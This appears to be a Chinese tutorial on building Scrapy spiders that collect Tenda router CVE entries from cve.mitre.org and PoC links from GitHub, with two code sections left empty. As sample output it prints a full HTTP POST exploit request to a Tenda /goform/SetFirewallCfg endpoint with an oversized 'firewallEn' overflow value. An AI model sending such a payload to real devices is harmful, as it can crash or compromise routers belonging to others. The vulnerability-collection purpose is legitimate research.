## Scrapy安装与使用
```shell
pip install --upgrade pip
pip install scrapy
```

创建项目
```
scrapy startproject tendaVuls
```

## 漏洞信息爬取
打开项目下`tendaVuls/items.py`文件，定义结构化数据字段，用来保存爬取到的数据。
```python
import scrapy

class CveInfoItem(scrapy.Item):
    # define the fields for your item here like:
    # name = scrapy.Field()
    cveId = scrapy.Field()
    description = scrapy.Field()
    references = scrapy.Field()
```

在目录下输入命令，创建名为tendaCVE的爬虫，并指定爬取域的范围
```
scrapy genspider tendaCVE "cve.mitre.org"
```

打开`spiders/tendaCVE.py`文件编写
```python 
import scrapy
from tendaVuls.items import CveInfoItem

class TendacveSpider(scrapy.Spider):
    name = "tendaCVE"
    allowed_domains = ["cve.mitre.org"]
    start_urls = ["https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=tenda"]

    def parse(self, response):
        cveUrls = response.xpath('//div[@id="TableWithRules"]/table//tr/td/a/@href').getall()
        for cveUrl in cveUrls:
            yield scrapy.Request(response.urljoin(cveUrl), self.cveInfoParse)
        return cveUrls

    def cveInfoParse(self, response):
        items = []
        item = CveInfoItem()
        item['cveId'] = response.xpath('//*[@id="GeneratedTable"]/table//tr[2]/td[1]/h2/text()').get()
        item['description'] = response.xpath('//*[@id="GeneratedTable"]/table//tr[4]/td/text()').get()
        item['references'] = response.xpath('//*[@id="GeneratedTable"]/table//tr[7]/td/ul/li/a/@href').getall()
        items.append(item)
        return items
```

保存，在项目目录下运行命令爬取，结构保存为json文件
```
scrapy crawl tendaCVE -o tendaCVE.json
```

## PoC爬取
下面爬取固件web漏洞PoC，简单起见，只爬取链接为github的。

在目录下输入命令，创建名为tendaPoC的爬虫
```
scrapy genspider tendaPoC "github.com"
```

为了从文件中读取URL，需要重写start_requests()方法
```

```

## github页面分析
提取github代码内容
```python
import requests
from lxml import etree
url = r"https://github.com/tianhui999/myCVE/blob/main/TX3/TX3-5.md"
res = requests.get(url)
element = etree.HTML(res.text)
nodes = element.xpath('//*[@id="readme"]/article/div//@data-snippet-clipboard-copy-content')
//nodes: ['code']
```

提取出的代码案例：
```text
'POST /goform/SetFirewallCfg HTTP/1.1\nHost: 192.168.23.133\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCookie: password=byn5gk\nConnection: close\nContent-Length: 1227\n\nfirewallEn=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
```

提取。包括请求方式、url、payload、hash(method : url : maxLengthParamName)

```

```


## 参考链接
[(178条消息) Python Scrapy多层爬取收集数据_kocor的博客-CSDN博客](https://blog.csdn.net/ygc123189/article/details/79160146)

[(179条消息) scrapy起始地址是从文件读取的解决办法_scrapy重写start_urls_苍穹之跃的博客-CSDN博客](https://blog.csdn.net/wenxingchen/article/details/119705336)

[(179条消息) Python Scrapy 爬虫 - 爬取多级别的页面_网络爬虫常用多级爬取吗_sigmarising的博客-CSDN博客](https://blog.csdn.net/sigmarising/article/details/83444106)